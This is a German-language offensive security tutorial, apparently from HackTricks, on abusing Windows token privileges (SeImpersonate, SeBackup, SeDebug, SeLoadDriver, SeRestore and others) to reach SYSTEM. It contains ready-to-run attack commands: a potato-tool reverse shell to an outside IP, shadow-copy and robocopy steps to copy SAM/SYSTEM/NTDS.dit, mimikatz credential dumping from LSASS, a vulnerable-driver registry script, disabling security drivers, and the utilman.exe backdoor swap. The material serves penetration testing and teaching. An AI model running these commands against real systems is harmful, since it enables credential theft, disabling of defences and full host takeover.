# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Wenn du **nicht weißt, was Windows Access Tokens sind**, lies zuerst diese Seite, bevor du fortfährst:


{{#ref}}
access-tokens.md
{{#endref}}

**Vielleicht kannst du Privilegien eskalieren, indem du die Tokens ausnutzt, die du bereits hast**

### SeImpersonatePrivilege

Dies ist ein Privileg, das von jedem Prozess gehalten wird und die Impersonation (aber nicht die Erstellung) eines beliebigen Tokens erlaubt, sofern ein Handle darauf erhalten werden kann. Ein privilegiertes Token kann von einem Windows-Dienst (DCOM) erhalten werden, indem man ihn dazu bringt, NTLM-Authentifizierung gegen einen Exploit durchzuführen, wodurch anschließend die Ausführung eines Prozesses mit SYSTEM-Privilegien ermöglicht wird. Diese Schwachstelle kann mit verschiedenen Tools ausgenutzt werden, wie [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (wobei winrm deaktiviert sein muss), [SweetPotato](https://github.com/CCob/SweetPotato) und [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Moderne Operator-Hinweise:

- **JuicyPotato ist legacy**: Auf Windows 10 1809+/Server 2019+ solltest du je nach noch erreichbarer RPC/COM-Oberfläche **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** oder **PrintSpoofer** bevorzugen.
- Wenn du einen Dienst kompromittiert hast, der als **`LOCAL SERVICE`** oder **`NETWORK SERVICE`** läuft, und `whoami /priv` ein **gefiltertes Token** ohne **SeImpersonatePrivilege**/**SeAssignPrimaryTokenPrivilege** zeigt, stelle zuerst den **standardmäßigen Privilegien-Satz** des Kontos wieder her (zum Beispiel mit **FullPowers**) und versuche danach erneut die potato-Familie.
- Einige neuere Forks sind operatorfreundlicher als die ursprünglichen Tools. Zum Beispiel bietet **SigmaPotato** Reflection/In-Memory-Ausführung und moderne Windows-Kompatibilität, während **PrintNotifyPotato** den PrintNotify- COM-Dienst ausnutzt und oft nützlich ist, wenn der klassische Spooler-Pfad deaktiviert ist.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Es ist **SeImpersonatePrivilege** sehr ähnlich, es verwendet die **gleiche Methode**, um ein privilegiertes Token zu erhalten.\
Dann erlaubt dieses Privileg, **einem neuen/suspendierten Prozess ein primäres Token zuzuweisen**. Mit dem privilegierten Impersonation-Token kannst du ein primäres Token ableiten (DuplicateTokenEx).\
Mit dem Token kannst du einen **neuen Prozess** mit 'CreateProcessAsUser' erstellen oder einen Prozess suspended erstellen und **das Token setzen** (im Allgemeinen kannst du das primäre Token eines laufenden Prozesses nicht ändern).

### SeTcbPrivilege

Wenn du dieses Token aktiviert hast, kannst du **KERB_S4U_LOGON** verwenden, um ein **Impersonation-Token** für jeden anderen Benutzer zu erhalten, ohne die Anmeldedaten zu kennen, **eine beliebige Gruppe** (admins) zum Token hinzufügen, das **integrity level** des Tokens auf "**medium**" setzen und dieses Token dem **current thread** zuweisen (SetThreadToken).

### SeBackupPrivilege

Das System wird durch dieses Privileg dazu veranlasst, **allen Lesezugriff** auf jede Datei zu gewähren (begrenzt auf Leseoperationen). Es wird verwendet, um **die Passwort-Hashes lokaler Administrator**-Konten aus der Registry zu lesen, wonach Tools wie "**psexec**" oder "**wmiexec**" mit dem Hash verwendet werden können (Pass-the-Hash technique). Diese Technik schlägt jedoch unter zwei Bedingungen fehl: wenn das Local Administrator-Konto deaktiviert ist oder wenn eine Policy aktiv ist, die lokalen Administratoren, die sich remote verbinden, die administrativen Rechte entzieht.\
In der Praxis ist der zuverlässigste eingebaute Workflow meist **VSS + `robocopy /b`**: einen Shadow Copy erstellen/offenlegen und dann `SAM`/`SYSTEM` oder `NTDS.dit` im **backup mode** kopieren, wodurch die Datei-ACLs umgangen werden.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Sie können dieses **privilege ausnutzen** mit:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or as explained in the **escalating privileges with Backup Operators** section of:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Berechtigung für **write access** auf jede Systemdatei, unabhängig von der Access Control List (ACL) der Datei, wird durch dieses privilege bereitgestellt. Es eröffnet zahlreiche Möglichkeiten zur escalation, einschließlich der Fähigkeit, **services zu modifizieren**, DLL Hijacking durchzuführen und **debuggers** über Image File Execution Options zu setzen, neben verschiedenen anderen Techniken.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege ist eine leistungsstarke Berechtigung, besonders nützlich, wenn ein Benutzer die Fähigkeit besitzt, tokens zu impersonate, aber auch in Abwesenheit von SeImpersonatePrivilege. Diese Fähigkeit beruht darauf, ein token zu impersonate, das denselben Benutzer repräsentiert und dessen integrity level nicht höher ist als das des aktuellen Prozesses.

**Key Points:**

- **Impersonation ohne SeImpersonatePrivilege:** Es ist möglich, SeCreateTokenPrivilege für EoP zu nutzen, indem tokens unter bestimmten Bedingungen impersonated werden.
- **Conditions for Token Impersonation:** Erfolgreiches impersonation erfordert, dass das Ziel-token zum selben Benutzer gehört und ein integrity level hat, das kleiner oder gleich dem integrity level des Prozesses ist, der die impersonation versucht.
- **Creation and Modification of Impersonation Tokens:** Benutzer können ein impersonation token erstellen und es durch Hinzufügen einer privilegierten group's SID (Security Identifier) erweitern.

### SeLoadDriverPrivilege

Dieses privilege erlaubt das **laden und entladen von device drivers** durch das Erstellen eines Registry-Eintrags mit spezifischen Werten für `ImagePath` und `Type`. Da direkter write access zu `HKLM` (HKEY_LOCAL_MACHINE) eingeschränkt ist, muss stattdessen `HKCU` (HKEY_CURRENT_USER) verwendet werden. Damit `HKCU` jedoch vom Kernel für die Treiberkonfiguration erkannt wird, muss ein bestimmter Pfad eingehalten werden.

Moderne offensive Nutzung ist normalerweise **BYOVD** (bring your own vulnerable driver): einen **signierten, aber verwundbaren** Kernel-Treiber laden und dann dessen IOCTLs verwenden, um Schutzmechanismen zu deaktivieren oder zu Kernel code execution zu springen. Beachten Sie, dass auf neueren Windows 11/Server-Builds die **Microsoft vulnerable driver blocklist** und/oder **HVCI/Memory Integrity** ältere öffentliche Chains oft unterbrechen, sodass die klassischen `szkg64.sys`-Beispiele nicht mehr universell zuverlässig sind.

Dieser Pfad ist `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, wobei `<RID>` der Relative Identifier des aktuellen Benutzers ist. Innerhalb von `HKCU` muss dieser gesamte Pfad erstellt werden, und zwei Werte müssen gesetzt werden:

- `ImagePath`, der Pfad zur auszuführenden Binärdatei
- `Type`, mit einem Wert von `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Zu befolgende Schritte:**

1. Greife aufgrund eingeschränkten write access auf `HKCU` statt auf `HKLM` zu.
2. Erstelle den Pfad `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` innerhalb von `HKCU`, wobei `<RID>` den Relative Identifier des aktuellen Benutzers darstellt.
3. Setze `ImagePath` auf den Ausführungspfad der Binärdatei.
4. Weise `Type` als `SERVICE_KERNEL_DRIVER` (`0x00000001`) zu.
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Mehr Möglichkeiten, dieses privilege in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege) zu missbrauchen

### SeTakeOwnershipPrivilege

Dies ist ähnlich wie **SeRestorePrivilege**. Seine Hauptfunktion erlaubt es einem Prozess, **den Besitz eines Objekts zu übernehmen**, und umgeht damit die Anforderung eines expliziten diskretionären Zugriffs durch die Bereitstellung von WRITE_OWNER-Zugriffsrechten. Der Prozess besteht darin, zunächst den Besitz des gewünschten Registry-Schlüssels zu erlangen, um Schreibzugriff zu erhalten, und anschließend die DACL zu ändern, um Schreiboperationen zu ermöglichen.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Dieses Privileg erlaubt es, **andere Prozesse zu debuggen**, einschließlich des Lesens und Schreibens im Speicher. Verschiedene Strategien für Memory Injection, die in der Lage sind, die meisten antivirus- und host intrusion prevention-Lösungen zu umgehen, können mit diesem Privileg eingesetzt werden.

Auf modernen Windows-Versionen gilt: `SeDebugPrivilege` reicht in der Regel aus, um **nicht geschützte SYSTEM-Prozesse** zu öffnen und deren Tokens zu duplizieren, aber es ist **keine** Garantie dafür, dass du **LSASS** ansprechen kannst. Wenn **RunAsPPL / LSA Protection** aktiviert ist, können nicht geschützte Prozesse LSASS nicht lesen oder in LSASS injizieren, selbst wenn `SeDebugPrivilege` vorhanden ist. In diesem Fall solltest du ein Token von einem anderen nicht-PPL SYSTEM-Prozess stehlen oder mit einem PPL-Bypass/BYOVD kombinieren, statt davon auszugehen, dass `procdump` funktioniert. Für ein vollständiges Token-Kopierbeispiel mit `SeDebugPrivilege` + `SeImpersonatePrivilege` siehe [diese Seite](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Du kannst [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) aus der [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) verwenden, um **den Speicher eines Prozesses zu erfassen**. Konkret kann das auf den Prozess des **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** angewendet werden, der dafür verantwortlich ist, Benutzeranmeldedaten zu speichern, sobald sich ein Benutzer erfolgreich an einem System angemeldet hat.

Du kannst diesen Dump dann in mimikatz laden, um Passwörter zu erhalten:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Wenn du eine `NT SYSTEM`-Shell erhalten willst, kannst du Folgendes verwenden:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Dieses Recht (Perform volume maintenance tasks) erlaubt das Öffnen roher Volume-Device-Handles (z. B. \\.\C:) für direkten Disk-I/O, der NTFS-ACLs umgeht. Damit kannst du Bytes jeder Datei auf dem Volume kopieren, indem du die zugrunde liegenden Blöcke liest, und so beliebige Dateien mit sensiblen Inhalten lesen (z. B. Machine private keys in %ProgramData%\Microsoft\Crypto\, Registry-Hives, SAM/NTDS via VSS). Das ist besonders wirkungsvoll auf CA-Servern, wo das Exfiltrieren des CA private key das Erstellen eines Golden Certificate ermöglicht, um jede Principal zu impersonieren.

Siehe detaillierte Techniken und Mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
Die **als Disabled angezeigten tokens** können normalerweise aktiviert werden, sodass du oft sowohl _Enabled_- als auch _Disabled_-Privilegien missbrauchen kannst.

### Enable All the tokens

Wenn du disabled privileges hast, kannst du das Skript [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) verwenden, um alle tokens zu aktivieren:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Oder das **script**, das in diesem [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) eingebettet ist.

## Table

Die vollständige Privilegien-Cheatsheet für Tokens findest du unter [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), die Zusammenfassung unten listet nur direkte Wege auf, das Privileg auszunutzen, um eine admin session zu erhalten oder sensible Dateien zu lesen.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------   | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Danke an [Aurélien Chalot](https://twitter.com/Defte_) für das Update. Ich werde versuchen, es bald in etwas rezeptartigeres umzuformulieren.                                                                                                                                                                                 |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Sensible Dateien mit `robocopy /b` oder dedizierten SeBackup-aware copy helpers lesen.                                                                                                                                                                                                                                                              | <p>- Großartig für `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` und manchmal `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` ist praktisch, aber dedizierte SeBackup cmdlets/APIs sind für gesperrte/offene Dateien oft flexibler.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Beliebige tokens inklusive lokaler admin rights mit `NtCreateToken` erstellen.                                                                                                                                                                                                                                                                      |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Einen **nicht-PPL** SYSTEM token duplizieren oder Speicher aus einem nicht geschützten Prozess dumpen.                                                                                                                                                                                                                                                | <p>LSASS dumping wird häufig blockiert, wenn RunAsPPL/LSA Protection aktiviert ist.</p><p>Script findest du bei [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Die **Potato family** / named-pipe impersonation verwenden, um SYSTEM zu starten (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                            | <p>Am praktischsten von service accounts wie IIS APPPOOL, MSSQL, scheduled tasks oder jedem Kontext aus, der bereits `SeImpersonatePrivilege` besitzt.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Einen signierten, aber verwundbaren Kernel-Treiber laden (BYOVD)<br>2. Die IOCTLs des Treibers verwenden, um Kernel R/W zu erhalten, Security-Tools zu deaktivieren oder auf SYSTEM zu eskalieren<br><br>Alternativ kann das Privileg genutzt werden, sicherheitsrelevante Treiber mit dem eingebauten Befehl <code>fltMC</code> zu entladen, also <code>fltMC sysmondrv</code></p>                     | <p>Ältere öffentliche Treiber wie <code>szkg64.sys</code> werden auf modernen Windows-Systemen zunehmend durch die vulnerable-driver blocklist / HVCI blockiert.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. PowerShell/ISE mit vorhandenem SeRestore-Privileg starten.<br>2. Das Privileg mit <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a> aktivieren).<br>3. utilman.exe in utilman.old umbenennen<br>4. cmd.exe in utilman.exe umbenennen<br>5. Die Konsole sperren und Win+U drücken</p> | <p>Der Angriff kann von einiger AV-Software erkannt werden.</p><p>Die alternative Methode beruht darauf, Service-Binaries, die in "Program Files" gespeichert sind, mit demselben Privileg zu ersetzen</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe in utilman.exe umbenennen<br>4. Die Konsole sperren und Win+U drücken</p>                                                                                                                                       | <p>Der Angriff kann von einiger AV-Software erkannt werden.</p><p>Die alternative Methode beruht darauf, Service-Binaries, die in "Program Files" gespeichert sind, mit demselben Privileg zu ersetzen.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Tokens manipulieren, sodass lokale admin rights enthalten sind. Kann SeImpersonate erfordern.</p><p>Noch zu verifizieren.</p>                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Schau dir diese Tabelle an, die Windows tokens definiert: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Schau dir [**dieses paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) über privesc mit tokens an.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
